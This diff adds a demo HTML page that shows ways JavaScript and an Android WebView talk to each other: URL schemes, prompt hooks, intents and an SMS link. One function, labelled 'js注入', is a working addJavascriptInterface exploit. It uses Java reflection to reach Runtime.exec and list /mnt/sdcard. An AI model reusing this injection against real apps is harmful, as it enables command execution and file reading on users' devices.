@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Android JavaScript</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <style type="text/css">
+
+    </style>
+   	<script type="application/javascript">
+   		function callByAndroid(){
+   			alert('Invoke by Android');
+   			return "Return from JavaScript";
+   		}
+   		
+   		function callAndroid(){
+   			android.hello("js invoke android");
+   		}
+   		
+   		function callAndroid2(){
+   			document.location = "xiyou://webview?result=1&amount=10";
+   		}
+   		
+   		function returnResult(ret){
+   			alert(ret);
+   		}
+   		
+   		function clickprompt(){
+   			var result = prompt("xiyou://prompt?status=success&amount=10");
+   			alert(result);
+   		}
+   		
+   		
+   		function injectToAndroidUriSamples(){
+   			/**
+   			 * Uri格式：
+   			 * scheme://authority?where=x&what=x&ext=x
+   			 * 
+   			 * where 处于哪个功能界面
+   			 * 		WHERE_PAY_METHOD  支付方式选择页面
+   			 * 		WHERE_PAY_EXECUTE  打开第三方支付
+   			 * 		WHERE_OTHERS	     其它
+   			 * what  具体操作
+   			 * 		WHAT_LOADING_SHOW 		loading框显示
+   			 * 		WHAT_LOADING_DISMISS	loading框隐藏
+   			 * 
+   			 * 		WHAT_PAY_CANCEL				支付取消
+   			 * 		WHAT_PAY_FAIL				支付失败
+   			 * 		WHAT_PAY_PROCESSING			支付进行中
+   			 * 		WHAT_PAY_SUCCESS			支付成功
+   			 * 
+   			 * 		WHAT_KEY_BACK				点击返回键
+   			 * ext  额外附加信息
+   			 * 		xxx字符串
+   			 * 
+   			 * eg:
+   			 * xiyou://pay?where=WHERE_PAY_METHOD&what=WHAT_KEY_BACK
+   			 */
+   			document.location = "xiyou://pay?where=WHERE_PAY_METHOD&what=WHAT_KEY_BACK";
+
+}
+
+	function jsInjectCode() {
+	
+		var i = 0;
+	
+		function getContents(inputStream) {
+			var contents = "" + i;
+			var b = inputStream.read();
+			var i = 1;
+			while(b != -1) {
+				var bString = String.fromCharCode(b);
+				contents += bString;
+				contents += "\n"
+				b = inputStream.read();
+			}
+			i = i + 1;
+			return contents;
+		}
+	
+		function execute(cmdArgs) {
+			for(var obj in window) {
+				console.log(obj);
+				if("getClass" in window[obj]) {
+					alert(obj);
+					return window[obj].getClass().forName("java.lang.Runtime").
+					getMethod("getRuntime", null).invoke(null, null).exec(cmdArgs);
+				}
+			}
+		}
+	
+		var p = execute(["ls", "/mnt/sdcard/"]);
+		document.write(getContents(p.getInputStream()));
+	}
+	
+	
+	function startApp(type){
+		
+		if(type == '1'){
+			window.location = 'hoorang://jsopenapp?param=Custom URI scheme';
+		}else{
+			/**
+			 * URI结构如下：
+			 *  package=[string];
+	      		action=[string];
+	      		category=[string];
+	      		component=[string];
+	      		scheme=[string];
+	      		
+			 */
+			window.location = 'hoorang://jsopenapp#Intent;action=android.intent.action.VIEW;category=android.intent.category.DEFAULT;category=android.intent.category.BROWSABLE;S.param=Intent-based URI;end';
+		}
+		
+	}
+	
+	function callSystemApp(type){
+
+		window.location = 'intent:smsto:10000#Intent;action=android.intent.action.SENDTO;end';
+	}
+   	</script>
+</head>
+<body>
+<h1>Android JavaScript</h1>
+<table cellspacing="0" style="border:1px solid grey;border-collapse:collapse;">
+    <thead style=" font-size:13px">
+    <tr>
+        <th colspan="4" style="text-align: center;">JavaScript & Android通信示例</th>
+        
+    </tr>
+    </thead>
+    <tbody style=" font-size:12px">
+   
+    <tr>
+        <td colspan="4">
+        	
+        	<button type="button" onclick="callAndroid2()">调用安卓(shouldOverrideUrlLoading)</button>
+        	<button type="button" onclick="callAndroid()">调用安卓(addJavascriptInterface)</button></br>
+        	<button type="button" onclick="clickprompt()">调用安卓(onJsPrompt)</button></br>
+        	<button type="button" onclick="jsInjectCode()">js注入</button></br>
+        	<button type="button" onclick="startApp('1')">Custom URI scheme</button></br>
+        	<button type="button" onclick="startApp('2')">Intent-based URI</button></br>
+        	<button type="button" onclick="callSystemApp('2')">发送短信</button>
+        </td>
+       
+    </tr>
+    </tbody>
+</table>
+
+
+</body>
+</html>
+
